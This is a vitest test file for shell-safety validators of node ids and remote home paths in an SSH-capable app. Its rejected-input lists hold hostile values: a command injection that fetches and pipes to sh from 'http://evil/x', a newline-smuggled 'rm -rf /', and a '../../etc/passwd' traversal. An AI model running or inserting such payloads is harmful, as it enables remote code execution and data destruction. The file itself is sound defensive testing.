import { describe, expect, it } from 'vitest'
import { NODE_ID_MAX, isSafeNodeId, isSafeRemoteHome } from './remote-safety'

describe('isSafeNodeId', () => {
  it('accepts every shape the app actually mints', () => {
    // `nextId()` in state/workspace.ts: `<prefix>-<base36 time>-<counter>`.
    for (const id of ['term-mabc123-7', 'ssh-mabc123-1', 'node-1', 'a', 'A_b.c-1', '9'])
      expect(isSafeNodeId(id)).toBe(true)
  })

  it('refuses anything a remote shell could read as structure', () => {
    for (const id of [
      'a;b',
      'a b',
      'a|b',
      'a$b',
      'a`b`',
      'a\nb',
      'a\\b',
      "a'b",
      'a"b',
      'n1;curl${IFS}http://evil/x|sh;#'
    ])
      expect(isSafeNodeId(id)).toBe(false)
  })

  it('refuses path-shaped and empty ids', () => {
    for (const id of ['', '.', '..', 'a/b', '../../etc/passwd', undefined])
      expect(isSafeNodeId(id)).toBe(false)
  })

  it('refuses an over-long id (a bounded value is a checkable value)', () => {
    expect(isSafeNodeId('a'.repeat(NODE_ID_MAX))).toBe(true)
    expect(isSafeNodeId('a'.repeat(NODE_ID_MAX + 1))).toBe(false)
    expect(isSafeNodeId('a'.repeat(300))).toBe(false)
  })
})

describe('isSafeRemoteHome', () => {
  it('accepts real absolute homes, including spaces and non-ASCII', () => {
    for (const h of ['/home/u', '/Users/Enes Kırca', '/var/lib/deploy', '/'])
      expect(isSafeRemoteHome(h)).toBe(true)
  })

  it('refuses a host answer carrying a control character — the newline is a command separator', () => {
    expect(isSafeRemoteHome('/home/u\nrm -rf /')).toBe(false)
    expect(isSafeRemoteHome('/home/u\r')).toBe(false)
    expect(isSafeRemoteHome('/home/u\t')).toBe(false)
    expect(isSafeRemoteHome('/home/u\x7f')).toBe(false)
  })

  it('refuses relative / empty / backslashed / untrimmed / absurd answers', () => {
    for (const h of ['', undefined, 'home/u', 'C:\\Users\\u', ' /home/u', '/home/u ', `/${'a'.repeat(5000)}`])
      expect(isSafeRemoteHome(h)).toBe(false)
  })
})
